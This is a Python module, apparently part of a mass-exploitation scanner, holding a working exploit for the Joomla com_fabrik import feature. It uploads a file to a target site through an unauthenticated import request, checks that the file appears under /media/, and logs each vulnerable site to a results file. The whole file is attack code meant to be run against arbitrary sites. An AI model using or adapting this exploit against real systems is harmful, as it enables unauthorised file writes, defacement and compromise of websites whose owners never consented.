# coding=utf-8
import requests
import printModule

Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
r = '\033[31m'
g = '\033[32m'
y = '\033[33m'
b = '\033[34m'
m = '\033[35m'
c = '\033[36m'
w = '\033[37m'
TextindeX = 'files/vuln.txt'


def Exploit(site):
    try:
        fileindex = {'userfile': (TextindeX, open(TextindeX, 'rb'), 'multipart/form-data')}
        post_data = {
            "name": "me.php",
            "drop_data": "1",
            "overwrite": "1",
            "field_delimiter": ",",
            "text_delimiter": "&quot;",
            "option": "com_fabrik",
            "controller": "import",
            "view": "import",
            "task": "doimport",
            "Itemid": "0",
            "tableid": "0"
        }
        Exp = 'http://' + site + "/index.php?option=com_fabrik&c=import&view=import&filetype=csv&table="
        requests.post(Exp, files=fileindex, data=post_data, timeout=10, headers=Headers)
        Check = requests.get('http://' + site + '/media/' + TextindeX.split('/')[1], headers=Headers,
                             timeout=10)
        if 'Vuln!!' in str(Check.content):
            with open('result/Index_results.txt', 'a') as writer:
                writer.write(site + '/media/' + TextindeX.split('/')[1] + '\n')
            return printModule.returnYes(site, 'N/A', 'Com_Fabric', 'Joomla')
        else:
            return printModule.returnNo(site, 'N/A', 'Com_Fabric', 'Joomla')
    except:
        return printModule.returnNo(site, 'N/A', 'Com_Fabric', 'Joomla')


